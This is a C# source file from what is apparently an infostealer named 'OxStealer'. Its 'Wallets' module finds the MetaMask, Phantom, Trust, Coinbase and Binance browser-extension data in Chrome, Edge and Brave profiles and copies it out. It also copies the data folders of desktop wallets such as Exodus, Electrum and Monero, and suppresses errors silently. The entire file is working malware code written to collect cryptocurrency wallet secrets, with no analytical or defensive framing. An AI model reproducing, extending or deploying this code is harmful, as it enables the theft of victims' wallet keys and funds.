using System;
using System.Collections.Generic;
using System.IO;

namespace OxStealer.Modules
{
    internal static class Wallets
    {
        static readonly Dictionary<string, string> Ext = new()
        {
            ["MetaMask"] = "nkbihfbeogaeaoehlefnkodbefgpgknn",
            ["Phantom"]  = "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            ["Trust"]    = "egjidjbpglichdcondbcbdnbeeppgdph",
            ["Coinbase"] = "hnfanknocfeofbddgcijnmhnfnkdnaad",
            ["Binance"]  = "fhbohimaelbohpjbbldcngcnapndodjp",
        };

        static readonly string[] FileWallets =
        {
            "Exodus", "Electrum", "atomic", "Coinomi", "Guarda", "Bitcoin", "bitmonero"
        };

        public static void GrabExtensions(string outDir)
        {
            var ud = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var roots = new[]
            {
                Path.Combine(ud, "Google", "Chrome", "User Data"),
                Path.Combine(ud, "Microsoft", "Edge", "User Data"),
                Path.Combine(ud, "BraveSoftware", "Brave-Browser", "User Data"),
            };

            foreach (var root in roots)
            {
                if (!Directory.Exists(root)) continue;
                foreach (var prof in Directory.GetDirectories(root))
                {
                    var store = Path.Combine(prof, "Local Extension Settings");
                    if (!Directory.Exists(store)) continue;
                    foreach (var kv in Ext)
                    {
                        var src = Path.Combine(store, kv.Value);
                        if (!Directory.Exists(src)) continue;
                        var dst = Path.Combine(outDir, "ext", Path.GetFileName(root) + "_" + Path.GetFileName(prof) + "_" + kv.Key);
                        CopyDir(src, dst);
                    }
                }
            }
        }

        public static void GrabFiles(string outDir)
        {
            var app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            foreach (var name in FileWallets)
            {
                var src = Path.Combine(app, name);
                if (!Directory.Exists(src)) continue;
                var dst = Path.Combine(outDir, "files", name);
                CopyDir(src, dst);
            }
        }

        static void CopyDir(string src, string dst)
        {
            Directory.CreateDirectory(dst);
            foreach (var f in Directory.GetFiles(src, "*", SearchOption.AllDirectories))
            {
                var rel = Path.GetRelativePath(src, f);
                var target = Path.Combine(dst, rel);
                Directory.CreateDirectory(Path.GetDirectoryName(target));
                try { File.Copy(f, target, true); } catch { }
            }
        }
    }
}